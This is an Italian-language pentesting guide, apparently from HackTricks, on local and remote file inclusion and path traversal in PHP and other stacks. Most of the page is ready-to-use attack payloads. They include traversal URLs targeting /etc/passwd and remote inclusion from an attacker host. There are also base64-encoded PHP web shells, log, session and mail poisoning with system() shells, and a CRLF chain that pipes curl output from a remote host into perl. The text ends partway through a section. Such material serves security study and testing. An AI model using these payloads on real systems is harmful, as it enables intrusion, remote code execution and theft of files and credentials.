# Inclusione di File/Traversata di Percorso

{{#include ../../banners/hacktricks-training.md}}

## Inclusione di File

**Inclusione di File Remota (RFI):** Il file viene caricato da un server remoto (Migliore: Puoi scrivere il codice e il server lo eseguirà). In php questo è **disabilitato** per impostazione predefinita (**allow_url_include**).\
**Inclusione di File Locale (LFI):** Il server carica un file locale.

La vulnerabilità si verifica quando l'utente può controllare in qualche modo il file che verrà caricato dal server.

Funzioni **PHP vulnerabili**: require, require_once, include, include_once

Uno strumento interessante per sfruttare questa vulnerabilità: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessante - file LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mescolando diverse liste LFI \*nix e aggiungendo più percorsi, ho creato questa:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Prova anche a cambiare `/` con `\`\
Prova anche ad aggiungere `../../../../../`

Una lista che utilizza diverse tecniche per trovare il file /etc/password (per controllare se la vulnerabilità esiste) può essere trovata [qui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Unione di diverse liste di parole:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Prova anche a cambiare `/` con `\`\
Prova anche a rimuovere `C:/` e aggiungere `../../../../../`

Una lista che utilizza diverse tecniche per trovare il file /boot.ini (per controllare se la vulnerabilità esiste) può essere trovata [qui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Controlla la lista LFI di linux.

## LFI di base e bypass

Tutti gli esempi sono per Local File Inclusion ma potrebbero essere applicati anche a Remote File Inclusion (pagina=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sequenze di traversamento rimosse non ricorsivamente
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Ignora l'aggiunta di più caratteri alla fine della stringa fornita (bypass di: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Questo è **risolto da PHP 5.4**

### **Codifica**

Puoi utilizzare codifiche non standard come la doppia codifica URL (e altre):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Dalla cartella esistente

Forse il back-end sta controllando il percorso della cartella:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Esplorare le Directory del File System su un Server

Il file system di un server può essere esplorato ricorsivamente per identificare directory, non solo file, impiegando determinate tecniche. Questo processo implica la determinazione della profondità della directory e la verifica dell'esistenza di specifiche cartelle. Di seguito è riportato un metodo dettagliato per raggiungere questo obiettivo:

1. **Determinare la Profondità della Directory:** Accertare la profondità della tua directory attuale recuperando con successo il file `/etc/passwd` (applicabile se il server è basato su Linux). Un esempio di URL potrebbe essere strutturato come segue, indicando una profondità di tre:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sonda per Cartelle:** Aggiungi il nome della cartella sospetta (ad esempio, `private`) all'URL, quindi torna a `/etc/passwd`. Il livello di directory aggiuntivo richiede di incrementare la profondità di uno:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpreta i Risultati:** La risposta del server indica se la cartella esiste:
- **Errore / Nessun Output:** La cartella `private` probabilmente non esiste nella posizione specificata.
- **Contenuti di `/etc/passwd`:** La presenza della cartella `private` è confermata.
4. **Esplorazione Ricorsiva:** Le cartelle scoperte possono essere ulteriormente esplorate per sottodirectory o file utilizzando la stessa tecnica o metodi tradizionali di Local File Inclusion (LFI).

Per esplorare directory in diverse posizioni nel file system, regola il payload di conseguenza. Ad esempio, per controllare se `/var/www/` contiene una directory `private` (supponendo che la directory corrente sia a una profondità di 3), usa:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Tecnica di Troncamento del Percorso**

Il troncamento del percorso è un metodo impiegato per manipolare i percorsi dei file nelle applicazioni web. Viene spesso utilizzato per accedere a file riservati bypassando alcune misure di sicurezza che aggiungono caratteri aggiuntivi alla fine dei percorsi dei file. L'obiettivo è creare un percorso di file che, una volta alterato dalla misura di sicurezza, punti ancora al file desiderato.

In PHP, varie rappresentazioni di un percorso di file possono essere considerate equivalenti a causa della natura del file system. Ad esempio:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` e `/etc/passwd/` sono tutti trattati come lo stesso percorso.
- Quando gli ultimi 6 caratteri sono `passwd`, aggiungere un `/` (rendendolo `passwd/`) non cambia il file mirato.
- Allo stesso modo, se `.php` viene aggiunto a un percorso di file (come `shellcode.php`), aggiungere un `/.` alla fine non altererà il file a cui si accede.

Gli esempi forniti dimostrano come utilizzare il troncamento del percorso per accedere a `/etc/passwd`, un obiettivo comune a causa del suo contenuto sensibile (informazioni sugli account utente):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In questi scenari, il numero di traversate necessarie potrebbe essere intorno a 2027, ma questo numero può variare in base alla configurazione del server.

- **Utilizzo di Segmenti di Punto e Caratteri Aggiuntivi**: Le sequenze di traversamento (`../`) combinate con segmenti di punto extra e caratteri possono essere utilizzate per navigare nel file system, ignorando efficacemente le stringhe aggiunte dal server.
- **Determinare il Numero Richiesto di Traversate**: Attraverso tentativi ed errori, si può trovare il numero preciso di sequenze `../` necessarie per navigare fino alla directory radice e poi a `/etc/passwd`, assicurandosi che eventuali stringhe aggiunte (come `.php`) siano neutralizzate ma il percorso desiderato (`/etc/passwd`) rimanga intatto.
- **Iniziare con una Directory Fittizia**: È una pratica comune iniziare il percorso con una directory inesistente (come `a/`). Questa tecnica viene utilizzata come misura precauzionale o per soddisfare i requisiti della logica di parsing del percorso del server.

Quando si impiegano tecniche di troncamento del percorso, è fondamentale comprendere il comportamento di parsing del percorso del server e la struttura del file system. Ogni scenario potrebbe richiedere un approccio diverso, e spesso è necessario testare per trovare il metodo più efficace.

**Questa vulnerabilità è stata corretta in PHP 5.3.**

### **Trucchi per bypassare i filtri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php questo è disabilitato per impostazione predefinita perché **`allow_url_include`** è **Off.** Deve essere **On** affinché funzioni, e in quel caso potresti includere un file PHP dal tuo server e ottenere RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Se per qualche motivo **`allow_url_include`** è **On**, ma PHP sta **filtrando** l'accesso a pagine web esterne, [secondo questo post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), potresti usare ad esempio il protocollo data con base64 per decodificare un codice PHP b64 e ottenere RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!NOTE]
> Nel codice precedente, il finale `+.txt` è stato aggiunto perché l'attaccante aveva bisogno di una stringa che terminasse con `.txt`, quindi la stringa termina con essa e dopo la decodifica b64 quella parte restituirà solo spazzatura e il vero codice PHP sarà incluso (e quindi, eseguito).

Un altro esempio **che non utilizza il protocollo `php://`** sarebbe:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root element

In python in a code like this one:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se l'utente passa un **percorso assoluto** a **`file_name`**, il **percorso precedente viene semplicemente rimosso**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
È il comportamento previsto secondo [la documentazione](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se un componente è un percorso assoluto, tutti i componenti precedenti vengono scartati e l'unione continua dal componente del percorso assoluto.

## Elenco delle directory Java

Sembra che se hai un Path Traversal in Java e **richiedi una directory** invece di un file, **viene restituito un elenco della directory**. Questo non accadrà in altre lingue (per quanto ne so).

## Top 25 parametri

Ecco un elenco dei 25 parametri principali che potrebbero essere vulnerabili a vulnerabilità di inclusione di file locali (LFI) (da [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI utilizzando wrapper e protocolli PHP

### php://filter

I filtri PHP consentono di eseguire **operazioni di modifica di base sui dati** prima che vengano letti o scritti. Ci sono 5 categorie di filtri:

- [Filtri Stringa](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Rimuove i tag dai dati (tutto ciò che si trova tra i caratteri "<" e ">")
- Nota che questo filtro è scomparso dalle versioni moderne di PHP
- [Filtri di Conversione](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Trasforma in una codifica diversa (`convert.iconv.<input_enc>.<output_enc>`). Per ottenere la **lista di tutte le codifiche** supportate, esegui nel terminale: `iconv -l`

> [!WARNING]
> Abusando del filtro di conversione `convert.iconv.*` puoi **generare testo arbitrario**, che potrebbe essere utile per scrivere testo arbitrario o per fare una funzione come includere testo arbitrario. Per ulteriori informazioni, controlla [**LFI2RCE tramite filtri php**](lfi2rce-via-php-filters.md).

- [Filtri di Compressione](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Comprimi il contenuto (utile se si esfiltra una grande quantità di informazioni)
- `zlib.inflate`: Decomprime i dati
- [Filtri di Crittografia](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Obsoleto
- `mdecrypt.*` : Obsoleto
- Altri Filtri
- Eseguendo in php `var_dump(stream_get_filters());` puoi trovare un paio di **filtri inaspettati**:
- `consumed`
- `dechunk`: inverte la codifica HTTP chunked
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> La parte "php://filter" è case insensitive

### Utilizzare i filtri php come oracolo per leggere file arbitrari

[**In questo post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) viene proposta una tecnica per leggere un file locale senza avere l'output restituito dal server. Questa tecnica si basa su una **esfiltrazione booleana del file (carattere per carattere) utilizzando i filtri php** come oracolo. Questo perché i filtri php possono essere utilizzati per rendere un testo abbastanza grande da far sì che php generi un'eccezione.

Nel post originale puoi trovare una spiegazione dettagliata della tecnica, ma ecco un rapido riassunto:

- Utilizza il codec **`UCS-4LE`** per lasciare il carattere iniziale del testo all'inizio e far aumentare esponenzialmente la dimensione della stringa.
- Questo sarà utilizzato per generare un **testo così grande quando la lettera iniziale è indovinata correttamente** che php attiverà un **errore**.
- Il filtro **dechunk** **rimuoverà tutto se il primo carattere non è esadecimale**, quindi possiamo sapere se il primo carattere è esadecimale.
- Questo, combinato con il precedente (e altri filtri a seconda della lettera indovinata), ci permetterà di indovinare una lettera all'inizio del testo vedendo quando facciamo abbastanza trasformazioni per far sì che non sia un carattere esadecimale. Perché se è esadecimale, dechunk non lo eliminerà e la bomba iniziale farà generare un errore a php.
- Il codec **convert.iconv.UNICODE.CP930** trasforma ogni lettera nella successiva (quindi dopo questo codec: a -> b). Questo ci permette di scoprire se la prima lettera è una `a`, ad esempio, perché se applichiamo 6 di questo codec a->b->c->d->e->f->g la lettera non è più un carattere esadecimale, quindi dechunk non l'ha eliminata e l'errore php viene attivato perché si moltiplica con la bomba iniziale.
- Utilizzando altre trasformazioni come **rot13** all'inizio è possibile esfiltrare altri caratteri come n, o, p, q, r (e altri codec possono essere utilizzati per spostare altre lettere nell'intervallo esadecimale).
- Quando il carattere iniziale è un numero è necessario codificarlo in base64 e esfiltrare le prime 2 lettere per esfiltrare il numero.
- Il problema finale è vedere **come esfiltrare più della lettera iniziale**. Utilizzando filtri di memoria ordinata come **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** è possibile cambiare l'ordine dei caratteri e ottenere in prima posizione altre lettere del testo.
- E per poter ottenere **ulteriori dati** l'idea è di **generare 2 byte di dati spazzatura all'inizio** con **convert.iconv.UTF16.UTF16**, applicare **UCS-4LE** per farlo **pivottare con i successivi 2 byte**, e **eliminare i dati fino ai dati spazzatura** (questo rimuoverà i primi 2 byte del testo iniziale). Continuare a farlo fino a raggiungere il bit desiderato da esfiltrare.

Nel post è stata anche esfiltrata una tool per eseguire questo automaticamente: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Questo wrapper consente di accedere ai descrittori di file che il processo ha aperti. Potenzialmente utile per esfiltrare il contenuto dei file aperti:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Puoi anche usare **php://stdin, php://stdout e php://stderr** per accedere ai **file descriptor 0, 1 e 2** rispettivamente (non sono sicuro di come questo possa essere utile in un attacco)

### zip:// e rar://

Carica un file Zip o Rar con un PHPShell all'interno e accedilo.\
Per poter abusare del protocollo rar, **deve essere attivato specificamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Nota che questo protocollo è limitato dalle configurazioni php **`allow_url_open`** e **`allow_url_include`**

### expect://

Expect deve essere attivato. Puoi eseguire codice usando questo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Specifica il tuo payload nei parametri POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un file `.phar` può essere utilizzato per eseguire codice PHP quando un'applicazione web sfrutta funzioni come `include` per il caricamento dei file. Il frammento di codice PHP fornito di seguito dimostra la creazione di un file `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Per compilare il file `.phar`, il seguente comando deve essere eseguito:
```bash
php --define phar.readonly=0 create_path.php
```
Al momento dell'esecuzione, verrà creato un file chiamato `test.phar`, che potrebbe essere sfruttato per sfruttare le vulnerabilità di Local File Inclusion (LFI).

Nei casi in cui l'LFI esegue solo la lettura dei file senza eseguire il codice PHP al loro interno, attraverso funzioni come `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, o `filesize()`, potrebbe essere tentato lo sfruttamento di una vulnerabilità di deserializzazione. Questa vulnerabilità è associata alla lettura di file utilizzando il protocollo `phar`.

Per una comprensione dettagliata dello sfruttamento delle vulnerabilità di deserializzazione nel contesto dei file `.phar`, fare riferimento al documento collegato qui sotto:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

È stato possibile abusare di **qualsiasi file arbitrario letto da PHP che supporta i filtri php** per ottenere un RCE. La descrizione dettagliata può essere [**trovata in questo post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Riepilogo molto rapido: un **overflow di 3 byte** nell'heap di PHP è stato abusato per **modificare la catena di chunk liberi** di una dimensione specifica al fine di poter **scrivere qualsiasi cosa in qualsiasi indirizzo**, quindi è stato aggiunto un hook per chiamare **`system`**.\
È stato possibile allocare chunk di dimensioni specifiche abusando di più filtri php.

### More protocols

Controlla più possibili [**protocollo da includere qui**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Scrivi in memoria o in un file temporaneo (non sono sicuro di come questo possa essere utile in un attacco di inclusione di file)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accesso al filesystem locale
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Accesso a URL HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accesso a URL FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Flussi di compressione
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Trova nomi di percorso che corrispondono a un modello (non restituisce nulla di stampabile, quindi non è davvero utile qui)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Flussi audio (non utile per leggere file arbitrari)

## LFI tramite 'assert' di PHP

I rischi di Local File Inclusion (LFI) in PHP sono notevolmente elevati quando si tratta della funzione 'assert', che può eseguire codice all'interno delle stringhe. Questo è particolarmente problematico se l'input contenente caratteri di traversamento delle directory come ".." viene controllato ma non correttamente sanificato.

Ad esempio, il codice PHP potrebbe essere progettato per prevenire il traversamento delle directory in questo modo:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Mentre questo mira a fermare la traversata, crea involontariamente un vettore per l'iniezione di codice. Per sfruttare questo per leggere i contenuti dei file, un attaccante potrebbe usare:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Allo stesso modo, per eseguire comandi di sistema arbitrari, si potrebbe usare:
```plaintext
' and die(system("id")) or '
```
È importante **URL-encode questi payload**.

## PHP Blind Path Traversal

> [!WARNING]
> Questa tecnica è rilevante nei casi in cui **controlli** il **percorso del file** di una **funzione PHP** che **accederà a un file** ma non vedrai il contenuto del file (come una semplice chiamata a **`file()`**) ma il contenuto non viene mostrato.

In [**questo incredibile post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) viene spiegato come un blind path traversal può essere abusato tramite un filtro PHP per **esfiltrare il contenuto di un file tramite un errore oracle**.

In sintesi, la tecnica utilizza la **codifica "UCS-4LE"** per rendere il contenuto di un file così **grande** che la **funzione PHP che apre** il file attiverà un **errore**.

Poi, per rivelare il primo carattere, il filtro **`dechunk`** viene utilizzato insieme ad altri come **base64** o **rot13** e infine i filtri **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** vengono utilizzati per **posizionare altri caratteri all'inizio e rivelarli**.

**Funzioni che potrebbero essere vulnerabili**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (solo target in sola lettura con questo)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Per i dettagli tecnici controlla il post menzionato!

## LFI2RCE

### Remote File Inclusion

Spiegato precedentemente, [**segui questo link**](./#remote-file-inclusion).

### Via file di log Apache/Nginx

Se il server Apache o Nginx è **vulnerabile a LFI** all'interno della funzione include potresti provare ad accedere a **`/var/log/apache2/access.log` o `/var/log/nginx/access.log`**, impostando all'interno del **user agent** o all'interno di un **parametro GET** una shell php come **`<?php system($_GET['c']); ?>`** e includere quel file

> [!WARNING]
> Nota che **se usi virgolette doppie** per la shell invece di **virgolette semplici**, le virgolette doppie verranno modificate per la stringa "_**quote;**_", **PHP genererà un errore** lì e **nient'altro verrà eseguito**.
>
> Inoltre, assicurati di **scrivere correttamente il payload** o PHP genererà un errore ogni volta che cerca di caricare il file di log e non avrai una seconda opportunità.

Questo potrebbe essere fatto anche in altri log ma **fai attenzione,** il codice all'interno dei log potrebbe essere URL encoded e questo potrebbe distruggere la Shell. L'intestazione **autorizzazione "basic"** contiene "user:password" in Base64 ed è decodificata all'interno dei log. La PHPShell potrebbe essere inserita all'interno di questa intestazione.\
Altri possibili percorsi di log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Invia una mail** a un account interno (user@localhost) contenente il tuo payload PHP come `<?php echo system($_REQUEST["cmd"]); ?>` e prova a includere nella mail dell'utente con un percorso come **`/var/mail/<USERNAME>`** o **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Carica molte shell (ad esempio: 100)
2. Includi [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), con $PID = PID del processo (può essere forzato) e $FD il file descriptor (può essere forzato anche questo)

### Via /proc/self/environ

Come un file di log, invia il payload nell'User-Agent, verrà riflesso all'interno del file /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Se puoi caricare un file, basta iniettare il payload della shell in esso (ad es: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Per mantenere il file leggibile, è meglio iniettare nei metadati delle immagini/doc/pdf

### Via caricamento di file Zip

Carica un file ZIP contenente una shell PHP compressa e accedi:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

Controlla se il sito web utilizza PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP, queste sessioni sono memorizzate nei file _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Imposta il cookie su `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Usa l'LFI per includere il file di sessione PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Se ssh è attivo, controlla quale utente viene utilizzato (/proc/self/status & /etc/passwd) e prova ad accedere a **\<HOME>/.ssh/id_rsa**

### **Via** **vsftpd** _**logs**_

I log per il server FTP vsftpd si trovano in _**/var/log/vsftpd.log**_. Nello scenario in cui esista una vulnerabilità di Local File Inclusion (LFI) e sia possibile accedere a un server vsftpd esposto, possono essere considerati i seguenti passaggi:

1. Inietta un payload PHP nel campo nome utente durante il processo di accesso.
2. Dopo l'iniezione, utilizza l'LFI per recuperare i log del server da _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Come mostrato in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) articolo, il filtro PHP base64 ignora semplicemente i Non-base64. Puoi usarlo per bypassare il controllo dell'estensione del file: se fornisci base64 che termina con ".php", ignorerà semplicemente il "." e aggiungerà "php" al base64. Ecco un esempio di payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Questo [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) spiega che puoi usare **php filters per generare contenuti arbitrari** come output. Il che significa fondamentalmente che puoi **generare codice php arbitrario** per l'inclusione **senza doverlo scrivere** in un file.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Carica** un file che sarà memorizzato come **temporaneo** in `/tmp`, poi nella **stessa richiesta,** attiva un **segmentation fault**, e poi il **file temporaneo non verrà eliminato** e puoi cercarlo.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Se hai trovato un **Local File Inclusion** e **Nginx** è in esecuzione davanti a PHP potresti essere in grado di ottenere RCE con la seguente tecnica:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Se hai trovato un **Local File Inclusion** anche se **non hai una sessione** e `session.auto_start` è `Off`. Se fornisci il **`PHP_SESSION_UPLOAD_PROGRESS`** nei dati **multipart POST**, PHP **abiliterà la sessione per te**. Potresti abusare di questo per ottenere RCE:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Se hai trovato un **Local File Inclusion** e il server è in esecuzione in **Windows** potresti ottenere RCE:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

Come [**spiegato in questo post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), lo script `/usr/local/lib/phppearcmd.php` esiste per impostazione predefinita nelle immagini docker di php. Inoltre, è possibile passare argomenti allo script tramite l'URL perché è indicato che se un parametro URL non ha un `=`, dovrebbe essere usato come argomento.

La seguente richiesta crea un file in `/tmp/hello.php` con il contenuto `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
L'abuso seguente di una vulnerabilità CRLF per ottenere RCE (da [**qui**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

Se hai trovato un **Local File Inclusion** e un file che espone **phpinfo()** con file_uploads = on puoi ottenere RCE:

{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Se hai trovato un **Local File Inclusion** e **puoi esfiltrare il percorso** del file temporaneo MA il **server** sta **controllando** se il **file da includere ha segni PHP**, puoi provare a **bypassare quel controllo** con questa **Race Condition**:

{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

